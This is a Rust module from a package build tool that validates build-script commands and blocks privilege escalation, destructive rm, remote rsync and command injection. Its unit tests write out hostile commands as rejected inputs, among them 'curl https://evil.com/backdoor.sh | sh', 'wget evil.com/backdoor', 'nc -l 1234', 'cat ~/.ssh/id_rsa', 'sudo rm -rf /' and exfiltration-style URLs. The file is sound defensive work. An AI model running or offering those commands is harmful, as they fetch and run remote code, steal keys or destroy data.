//! Command parsing and validation
//!
//! This module provides secure command parsing and validation to prevent
//! execution of dangerous commands during the build process.

use super::rules::{DANGEROUS_COMMANDS, DANGEROUS_PATTERNS, SYSTEM_PATHS};
use sps2_errors::{BuildError, Error};

/// Parsed and validated command
#[derive(Debug, Clone)]
pub struct ValidatedCommand {
    pub program: String,
    pub args: Vec<String>,
}

/// Parse and validate a simple command string
pub fn parse_and_validate_command(
    command: &str,
    sps2_config: Option<&sps2_config::Config>,
) -> Result<ValidatedCommand, Error> {
    let command = command.trim();
    if command.is_empty() {
        return Err(BuildError::CommandParseError {
            command: command.to_string(),
            reason: "Empty command".to_string(),
        }
        .into());
    }

    // Split command into program and arguments
    let parts: Vec<&str> = command.split_whitespace().collect();
    if parts.is_empty() {
        return Err(BuildError::CommandParseError {
            command: command.to_string(),
            reason: "No command specified".to_string(),
        }
        .into());
    }

    let program = parts[0];
    let args: Vec<String> = parts[1..].iter().map(|&s| s.to_string()).collect();

    // Validate the program
    validate_program(program, command, sps2_config)?;

    // Special validation for specific programs
    if program == "rsync" {
        validate_rsync_command(&args, command)?;
    }

    // Validate arguments
    for arg in &args {
        validate_argument(arg, command)?;
    }

    Ok(ValidatedCommand {
        program: program.to_string(),
        args,
    })
}

/// Validate a shell command (executed with sh -c)
pub fn validate_shell_command(
    shell: &str,
    sps2_config: Option<&sps2_config::Config>,
) -> Result<(), Error> {
    // Use the new parser-based validation
    let tokens = super::parser::tokenize_shell(shell);
    super::parser::validate_tokens(&tokens, sps2_config)?;

    // Still check for dangerous patterns that might slip through tokenization
    for pattern in DANGEROUS_PATTERNS {
        if shell.contains(pattern) {
            return Err(BuildError::DangerousCommand {
                command: shell.to_string(),
                reason: format!("Shell command contains dangerous pattern: {pattern}"),
            }
            .into());
        }
    }

    Ok(())
}

/// Validate a program name
fn validate_program(
    program: &str,
    full_command: &str,
    sps2_config: Option<&sps2_config::Config>,
) -> Result<(), Error> {
    // First check config if available
    if let Some(config) = sps2_config {
        if !config.is_command_allowed(program) {
            return Err(BuildError::DangerousCommand {
                command: full_command.to_string(),
                reason: format!("Command '{program}' is not in the allowed commands list"),
            }
            .into());
        }
    } else {
        // Fall back to hardcoded dangerous commands check
        if DANGEROUS_COMMANDS.contains(&program) {
            return Err(BuildError::DangerousCommand {
                command: full_command.to_string(),
                reason: format!("Command '{program}' is not allowed"),
            }
            .into());
        }
    }

    // Special validation for rm command
    if program == "rm" {
        validate_rm_command(full_command)?;
    }

    // Check for privilege escalation
    if program == "sudo" || program == "doas" || program == "su" {
        return Err(BuildError::DangerousCommand {
            command: full_command.to_string(),
            reason: "Privilege escalation commands are not allowed".to_string(),
        }
        .into());
    }

    // Check for path traversal in program name
    if program.contains("..") {
        return Err(BuildError::InvalidPath {
            path: program.to_string(),
            reason: "Path traversal in command name is not allowed".to_string(),
        }
        .into());
    }

    Ok(())
}

/// Validate a command argument
fn validate_argument(arg: &str, full_command: &str) -> Result<(), Error> {
    // Check for dangerous rm patterns
    if full_command.starts_with("rm ") || full_command.contains(" rm ") {
        validate_rm_argument(arg, full_command)?;
    }

    // Check for system paths
    for system_path in SYSTEM_PATHS {
        // Skip if the argument contains a variable expansion - these are evaluated at build time
        if arg.contains("${") {
            continue;
        }

        // Only check if argument starts with or equals a system path
        // "/" alone is too broad - it catches normal paths like "src/"
        if (arg == *system_path
            || (system_path != &"/" && arg.starts_with(&format!("{system_path}/"))))
            && !is_safe_system_path_usage(full_command, system_path)
        {
            return Err(BuildError::DangerousCommand {
                command: full_command.to_string(),
                reason: format!("Argument references system path: {system_path}"),
            }
            .into());
        }
    }

    // Check for command injection attempts in arguments
    if arg.contains(';') || arg.contains('|') || arg.contains('&') {
        // These might be legitimate in quoted strings, but we err on the side of caution
        return Err(BuildError::CommandParseError {
            command: full_command.to_string(),
            reason: "Command separators in arguments are not allowed".to_string(),
        }
        .into());
    }

    Ok(())
}

/// Validate rm command specifically
fn validate_rm_command(full_command: &str) -> Result<(), Error> {
    let parts: Vec<&str> = full_command.split_whitespace().collect();

    // Check if command has both -r and -f flags (in any combination)
    let has_recursive = parts.iter().any(|&part| {
        part == "-r"
            || part == "-R"
            || part.starts_with('-') && part.contains('r') && !part.starts_with("--")
    });

    let has_force = parts.iter().any(|&part| {
        part == "-f" || part.starts_with('-') && part.contains('f') && !part.starts_with("--")
    });

    // Block rm -rf in any form
    if has_recursive && has_force {
        return Err(BuildError::DangerousCommand {
            command: full_command.to_string(),
            reason: "rm -rf is not allowed in build scripts".to_string(),
        }
        .into());
    }

    // Even without -rf, validate what's being removed
    for part in parts.iter().skip(1) {
        // Skip "rm" itself
        if !part.starts_with('-') {
            validate_rm_target(part, full_command)?;
        }
    }

    Ok(())
}

/// Validate rm command arguments specifically
fn validate_rm_argument(arg: &str, full_command: &str) -> Result<(), Error> {
    validate_rm_target(arg, full_command)
}

/// Validate what rm is trying to delete
fn validate_rm_target(target: &str, full_command: &str) -> Result<(), Error> {
    // Block rm -rf /
    if target == "/" || target == "/*" {
        return Err(BuildError::DangerousCommand {
            command: full_command.to_string(),
            reason: "Attempting to delete root filesystem".to_string(),
        }
        .into());
    }

    // Block rm of system directories
    for system_path in SYSTEM_PATHS {
        if target == *system_path || target.starts_with(&format!("{system_path}/")) {
            return Err(BuildError::DangerousCommand {
                command: full_command.to_string(),
                reason: format!("Attempting to delete system directory: {system_path}"),
            }
            .into());
        }
    }

    Ok(())
}

/// Check if a system path usage is safe (e.g., reading from /usr/include is ok)
fn is_safe_system_path_usage(command: &str, system_path: &str) -> bool {
    // Allow reading from certain system paths
    match system_path {
        "/usr/include" | "/usr/lib" | "/usr/local" => {
            // These are commonly read during builds
            !command.contains("rm ") && !command.contains("mv ") && !command.contains("chmod ")
        }
        "/" => {
            // Special case for root path - it's often used in paths like ${DESTDIR}/opt/pm/...
            // Allow if it's part of a variable expansion or build-related path
            command.contains("${DESTDIR}") || 
            command.contains("${PREFIX}") ||
            command.contains("/opt/pm/build/") ||
            // Allow cd command with paths that include variables
            (command.starts_with("cd ") && command.contains("${"))
        }
        "/opt/pm/live" => {
            // Allow operations in live directory when prefixed with DESTDIR
            command.contains("${DESTDIR}")
        }
        _ => false,
    }
}

// Note: More sophisticated path and command validation is handled by SecurityContext
// during execution, which tracks state and handles variable expansion properly.

/// Validate rsync command specifically
fn validate_rsync_command(args: &[String], full_command: &str) -> Result<(), Error> {
    // Check if it's trying to use remote rsync
    if super::rules::is_remote_rsync(args) {
        return Err(BuildError::DangerousCommand {
            command: full_command.to_string(),
            reason: "Remote rsync operations are not allowed during builds".to_string(),
        }
        .into());
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_simple_command() {
        let cmd = parse_and_validate_command("ls -la", None).unwrap();
        assert_eq!(cmd.program, "ls");
        assert_eq!(cmd.args, vec!["-la"]);
    }

    #[test]
    fn test_block_dangerous_commands() {
        assert!(parse_and_validate_command("rm -rf /", None).is_err());
        assert!(parse_and_validate_command("sudo make install", None).is_err());
        assert!(parse_and_validate_command("chmod 777 /etc/passwd", None).is_err());
    }

    #[test]
    fn test_validate_shell_command() {
        let config = sps2_config::Config::default();

        assert!(validate_shell_command("echo 'Hello World'", Some(&config)).is_ok());
        assert!(validate_shell_command("cd build && make", Some(&config)).is_ok());
        assert!(validate_shell_command("sudo make install", Some(&config)).is_err());
        assert!(validate_shell_command("rm -rf /", Some(&config)).is_err());
    }

    #[test]
    fn test_command_substitution_validation() {
        let config = sps2_config::Config::default();

        assert!(validate_shell_command("echo $(pwd)", Some(&config)).is_ok());
        assert!(validate_shell_command("echo $(sudo cat /etc/passwd)", Some(&config)).is_err());
    }

    #[test]
    fn test_rsync_validation() {
        // Local rsync should be allowed
        let cmd = parse_and_validate_command("rsync -av src/ dest/", None).unwrap();
        assert_eq!(cmd.program, "rsync");

        // Remote rsync should be blocked
        assert!(parse_and_validate_command("rsync -av user@host:/path ./", None).is_err());
        assert!(parse_and_validate_command("rsync -av ./ host:/path", None).is_err());
    }

    #[test]
    fn test_dangerous_patterns() {
        // Test various dangerous shell patterns
        assert!(validate_shell_command("echo 'test' > /etc/passwd", None).is_err());
        assert!(validate_shell_command("cat ~/.ssh/id_rsa", None).is_err());
        assert!(validate_shell_command("export PATH=/evil/path:$PATH", None).is_err());
        assert!(validate_shell_command("nohup ./daemon &", None).is_err());
    }

    #[test]
    fn test_url_validation() {
        use super::super::validate_url;

        // Good URLs
        assert!(validate_url("https://github.com/example/repo").is_ok());
        assert!(validate_url("https://example.com/file.tar.gz").is_ok());

        // Suspicious URLs
        assert!(validate_url("https://webhook.site/test").is_err());
        assert!(validate_url("https://example.ngrok.io/data").is_err());
        assert!(validate_url("http://example.com:4444/shell").is_err());
        assert!(validate_url("file:///etc/passwd").is_err());
    }

    #[test]
    fn test_path_validation() {
        use super::super::validate_path;

        // Good paths
        assert!(validate_path("./src/main.rs").is_ok());
        assert!(validate_path("../patches/fix.patch").is_ok());
        assert!(validate_path("/opt/pm/build/src").is_ok());

        // Bad paths
        assert!(validate_path("../../../etc/passwd").is_err());
        assert!(validate_path("/etc/passwd").is_err());
        assert!(validate_path("/usr/bin/sudo").is_err());
    }

    #[test]
    fn test_build_variable_paths() {
        let config = sps2_config::Config::default();

        // Test that paths with build variables are allowed
        assert!(validate_shell_command("cd ${DESTDIR}/opt/pm/live/bin", Some(&config)).is_ok());
        assert!(
            validate_shell_command("mkdir -p ${DESTDIR}${PREFIX}/share", Some(&config)).is_ok()
        );
        assert!(validate_shell_command("ln -sf ${DESTDIR}/usr/lib/foo.so", Some(&config)).is_ok());

        // But direct system paths without variables should still be blocked
        assert!(validate_shell_command("cd /bin", Some(&config)).is_err());
        assert!(validate_shell_command("rm -rf /usr/bin/something", Some(&config)).is_err());
    }

    #[test]
    fn test_multiline_shell_commands() {
        let config = sps2_config::Config::default();

        // Test that multiline commands are validated properly
        let good_multiline = "cd ${DESTDIR}/opt/pm/live/bin\nln -sf pkgconf pkg-config";
        assert!(validate_shell_command(good_multiline, Some(&config)).is_ok());

        // Test that sudo is blocked in multiline commands
        let bad_multiline =
            "cd ${DESTDIR}/opt/pm/live/bin\nln -sf pkgconf pkg-config\nsudo mkdir hell/";
        assert!(validate_shell_command(bad_multiline, Some(&config)).is_err());

        // Test that any non-allowed command is blocked
        let bad_multiline2 = "cd build\ncurl https://evil.com/backdoor.sh | sh";
        assert!(validate_shell_command(bad_multiline2, Some(&config)).is_err());
    }

    #[test]
    fn test_command_separators() {
        let config = sps2_config::Config::default();

        // Test pipe - sudo after pipe should be blocked
        assert!(validate_shell_command("echo test | sudo tee /etc/passwd", Some(&config)).is_err());
        assert!(validate_shell_command("cat file | sh", Some(&config)).is_err());

        // Test semicolon - commands after semicolon should be validated
        assert!(validate_shell_command("cd build; sudo make install", Some(&config)).is_err());
        assert!(validate_shell_command("echo test; curl evil.com", Some(&config)).is_err());

        // Test && operator
        assert!(validate_shell_command("cd build && sudo make install", Some(&config)).is_err());
        assert!(validate_shell_command("make && wget evil.com/backdoor", Some(&config)).is_err());

        // Test || operator
        assert!(validate_shell_command("make || sudo make force", Some(&config)).is_err());
        assert!(validate_shell_command("test -f file || nc -l 1234", Some(&config)).is_err());

        // Test background operator &
        assert!(validate_shell_command("make & sudo rm -rf /", Some(&config)).is_err());

        // Test output redirection shouldn't affect command detection
        assert!(validate_shell_command("echo test > file.txt", Some(&config)).is_ok());
        assert!(validate_shell_command("sudo echo test > file.txt", Some(&config)).is_err());

        // Test input redirection
        assert!(validate_shell_command("grep pattern < file.txt", Some(&config)).is_ok());
        assert!(validate_shell_command("sudo grep pattern < file.txt", Some(&config)).is_err());

        // Test append redirection
        assert!(validate_shell_command("echo test >> file.txt", Some(&config)).is_ok());
        assert!(validate_shell_command("sudo echo test >> file.txt", Some(&config)).is_err());

        // Test complex command chains
        assert!(validate_shell_command("cd build && make && echo done", Some(&config)).is_ok());
        assert!(
            validate_shell_command("cd build && make && sudo make install", Some(&config)).is_err()
        );

        // Test that allowed commands work with separators
        assert!(validate_shell_command("cd build; make; echo done", Some(&config)).is_ok());
        assert!(validate_shell_command(
            "test -f file && echo exists || echo missing",
            Some(&config)
        )
        .is_ok());
    }

    #[test]
    fn test_command_injection_attempts() {
        let config = sps2_config::Config::default();

        // Test command substitution attempts
        assert!(validate_shell_command("echo $(sudo cat /etc/passwd)", Some(&config)).is_err());
        assert!(validate_shell_command("echo `sudo rm -rf /`", Some(&config)).is_err());

        // Test escaping attempts
        assert!(validate_shell_command("echo test\nsudo rm -rf /", Some(&config)).is_err());
        assert!(validate_shell_command("echo test\n\nsudo chmod 777 /", Some(&config)).is_err());

        // Test hidden commands with extra spaces/tabs
        assert!(validate_shell_command("echo test ;   sudo make install", Some(&config)).is_err());
        assert!(validate_shell_command("echo test\t;\tsudo make install", Some(&config)).is_err());

        // Test commands hidden after comments
        assert!(
            validate_shell_command("echo test # comment\nsudo rm -rf /", Some(&config)).is_err()
        );

        // Test here-doc attempts (if someone tries to be clever)
        assert!(validate_shell_command("cat << EOF\nsudo rm -rf /\nEOF", Some(&config)).is_err());
    }
}
